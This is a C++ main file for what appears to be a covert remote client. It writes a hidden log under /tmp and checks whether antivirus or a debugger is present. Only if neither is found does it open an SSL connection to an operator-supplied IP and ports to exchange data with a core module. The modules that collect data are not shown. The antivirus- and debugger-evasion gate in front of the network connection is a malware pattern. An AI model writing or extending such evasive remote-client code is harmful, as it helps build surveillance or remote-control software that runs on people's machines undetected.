#include "Network.h"
#include <cstdlib>
#include <thread>
#include <iostream>
#include "Logger.hpp"
#include "Core.h"
#include "AntiDbg.h"
#include "ASocket.hpp"

int main(int ac, char **av)
{
  int ret = EXIT_FAILURE;

  if (ac != 4)
    {
      std::cout << "Usage: " << *av << " ip_address port portData"
                << std::endl;
      return ret;
    }

  std::string const   ip(*(av + 1));
  std::uint16_t const port =
      static_cast<std::uint16_t>(std::strtol(*(av + 2), nullptr, 10));
  std::uint16_t const dataPort =
      static_cast<std::uint16_t>(std::strtol(*(av + 3), nullptr, 10));

  try
    {
#ifndef _WIN32
      nope::log::Logger::start("/tmp/.debug.log"); // TODO: rm
#else
      nope::log::Logger::start(".debug.log"); // TODO: rm
#endif
      nope::log::Logger::logLevel = nope::log::LogLevel::LOG_DEBUG;

      nope::log::Log(Info) << "Logger started";
    }
  catch (std::exception const &e)
    {
      std::cerr << "Fatal error while initializing the logger: " << e.what()
                << std::endl;
      return ret;
    }

  try
    {
#ifndef _WIN32
      spider::client::core::Core core("/tmp/spider/");
#else
      spider::client::core::Core core("./");
#endif

      // Check for a debugger
      if (!spider::misc::Debugger::isBeingAV() &&
          !spider::misc::Debugger::isDebuggerPresent())
	{
	  // Start network thread
	  std::thread networkThread([&]() {
	    try
	      {
		::network::ASocket::initSSL();
		spider::client::Network net(core.getSendToNetwork(),
		                            core.getReceivedFromNetwork(),
		                            core.getResponseQueue());

		net.run(port, dataPort, ip, true);
		::network::ASocket::deinitSSL();
	      }
	    catch (std::exception const &err)
	      {
		nope::log::Log(Error) << "Network: " << err.what();
	      }
	  });

	  // Run core
	  core.init();
	  ret = core.run();

	  // Stop thread
	  if (networkThread.joinable())
	    {
	      networkThread.join();
	    }
	}
    }
  catch (std::exception const &e)
    {
      nope::log::Log(Error) << "Error: " << e.what();
      system("pause");
      ret = EXIT_FAILURE;
    }

  if (ret == EXIT_FAILURE)
    {
      std::cout << "Not today..." << std::endl;
    }
  return ret;
}
